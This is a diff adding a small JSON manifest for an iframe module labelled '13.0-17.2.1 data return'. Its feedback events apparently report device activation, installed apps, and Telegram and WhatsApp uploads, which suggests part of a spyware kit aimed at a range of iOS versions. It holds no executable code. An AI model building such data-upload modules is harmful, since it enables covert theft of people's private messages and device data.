@@ -1,0 +1,18 @@
+{
+  "schemaVersion": 1,
+  "type": "iframe-c",
+  "version": "1.0.4",
+  "integrationKey": "device-data-13.0-17.2.1",
+  "name": "13.0-17.2.1数据回传",
+  "description": "13.0-17.2.1版本",
+  "entry": "index.html",
+  "feedback": {
+    "enabled": true,
+    "events": [
+      "device_activate",
+      "device_apps",
+      "telegram_upload",
+      "whatsapp_upload"
+    ]
+  }
+}
